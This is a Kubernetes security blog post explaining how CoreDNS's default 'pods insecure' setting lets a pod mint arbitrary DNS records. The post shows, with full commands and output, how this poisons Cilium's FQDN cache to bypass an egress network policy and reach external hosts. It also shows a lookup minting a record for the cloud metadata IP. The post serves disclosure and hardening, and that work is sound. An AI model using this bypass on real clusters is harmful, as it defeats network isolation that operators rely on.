---
title: "Kubernetes' Default CoreDNS Configuration is *insecure*"
date: 2026-05-18
Description: "Discover how a default CoreDNS configuration left over for backward compatibility can allow attackers to completely bypass Cilium network policies."
thumbnail: "images/thumbnails/kubernetes_coredns_insecure.png"
Tags: ["kubernetes", "coredns", "secure-by-default", "cilium", "kube-dns"]
Draft: false
---

[CoreDNS](https://github.com/coredns/coredns) is the DNS server that powers most (all?) Kubernetes distributions,
ever since it was made the default in [v1.13](https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.13.md#sig-network) in December 2018.

Chances are, you've never heard of or used its predecessor: [kube-dns](https://github.com/kubernetes/dns). Lucky for us, CoreDNS still has a config option to remind us. `pods insecure` is the [default configuration option](https://github.com/kubernetes/kubernetes/blob/release-1.35/cmd/kubeadm/app/phases/addons/dns/manifests.go#L178) for most (again - all?) Kubernetes distributions, and was introduced as an option to provide ["backward compatibility with kube-dns"](https://coredns.io/plugins/kubernetes/). The simple fact that the option's value is **insecure** should be enough to make us reconsider.

But alas... it is not. So, what does it do? And, what are the implications?

## What does it do?

Let's go to our [favorite K8s playground](https://labs.iximiuz.com/playgrounds), spin up a cluster, and quickly confirm we are working with the `insecure` configuration: 

```sh-session
$ kubectl -n kube-system get cm coredns -oyaml
```

And indeed we are:

```yaml
apiVersion: v1
kind: ConfigMap
data:
  Corefile:
    .:53 {
        errors
        health {
           lameduck 5s
        }
        ready
        kubernetes cluster.local in-addr.arpa ip6.arpa {
           pods insecure
           fallthrough in-addr.arpa ip6.arpa
           ttl 30
        }
        prometheus :9153
        forward . /etc/resolv.conf {
           max_concurrent 1000
        }
        cache 30 {
           disable success cluster.local
           disable denial cluster.local
        }
        loop
        reload
        loadbalance
    }
```

As the documentation states, this option forces CoreDNS to "always return an A record with IP from request (without checking k8s)". Basically, this gives us the option to mint arbitrary DNS A records. Let's create a pod and have some fun:

```sh
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: default
  labels:
    app: attacker
spec:
  containers:
  - name: attacker
    image: ubuntu:noble
    command: ["sleep", "3600"]
    resources:
      limits:
        memory: "256Mi"
        cpu: "250m"
EOF
kubectl exec attacker -it -- bash
```

Inside the pod:

```sh-session
$ apt update && apt install -y curl dnsutils
$ dig +short 169-254-169-254.default.pod.cluster.local
169.254.169.254
```

### What are the implications?

As the CoreDNS documentation further states, "this option is vulnerable to abuse if used maliciously in conjunction with wildcard SSL certs". While this is definitely an issue, I'd like to take a different route here.

Let's assume we have Cilium installed in our cluster to handle network policies. Let's further assume we have a network policy like so:

```yaml
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: limit-to-local
  namespace: default
spec:
  endpointSelector:
    matchLabels:
      app: attacker
  egress:
    # Rule 1: Allow DNS resolution (Required for FQDN rules to work)
    - toEndpoints:
      - matchLabels:
          "k8s:io.kubernetes.pod.namespace": kube-system
          k8s-app: kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP
          rules:
            dns:
              - matchPattern: "*"
    # Rule 2: Allow internal traffic only, or...?
    - toFQDNs:
        - matchPattern: "**.cluster.local"
      toPorts:
        - ports:
            - port: "443"
              protocol: TCP
            - port: "80"
              protocol: TCP
```

One would assume that this policy prevents any outbound network traffic... and indeed it does:

```sh-session
$ kubectl exec attacker -it -- curl ifconfig.me
203.0.113.0

$ kubectl apply -f netpol.yaml 
ciliumnetworkpolicy.cilium.io/limit-to-local created

$ kubectl exec attacker -it -- curl ifconfig.me
**cricket noises**
```

Let's check which IP this is trying to connect to:

```sh-session
$ kubectl exec attacker -it -- curl -v ifconfig.me
* Host ifconfig.me:80 was resolved.
* IPv6: 2600:1901:0:b2bd::
* IPv4: 34.160.111.145
```

If we show Cilium that this IP belongs to `*.cluster.local`, it will generously let us pass:

```sh-session
$ kubectl exec attacker -it -- dig +short 34-160-111-145.default.pod.cluster.local
34.160.111.145
$ kubectl exec attacker -it -- curl ifconfig.me
203.0.113.0
```

### What happened here?

Cilium keeps a list of all the IPs and FQDNs it has seen and will make policy decisions based on these values.

```
$ kubectl -n kube-system exec cilium-vvlqz -- cilium fqdn cache list
Endpoint   Source       FQDN                                        TTL   ExpirationTime             IPs                       
198        connection   34-160-111-145.default.pod.cluster.local.   0     2026-05-18T20:45:11.234Z   34.160.111.145            
198        connection   ifconfig.me.                                0     2026-05-18T20:45:11.234Z   34.160.111.145            
```

I have [reported](/cilium-report.md) this to the Cilium project, and they have [improved their documentation](https://github.com/cilium/cilium/pull/45525) to mitigate this issue.

{{< info >}}
The cache is local to the node. Make sure to run the `cilium` command in a cilium pod that shares the node with your attacker pod.
{{< /info >}}

## Conclusion

All of this is to say: It has been 8 years since we made the switch from kube-dns to CoreDNS. I think it is time to also make the switch from the `insecure` compatibility flag to `verified` and make our cluster DNS a little bit more secure.

I have raised this issue during the [SIG Security meeting in April](https://docs.google.com/document/d/1GgmmNYN88IZ2v2NBiO3gdU8Riomm0upge_XNVxEYXp0/edit?tab=t.0#heading=h.iab0zz7n53x1), and [raised an issue with the CoreDNS project](https://github.com/coredns/coredns/issues/8043). I hope that this blog post servers as one more reason to start changing the default to `verified` in every Kubernetes distribution.

If you are a K8s distribution maintainer, [please reach out](https://www.linkedin.com/in/fabian-kammel-7781b7173/)! I am happy to share my findings to aid in your migration.
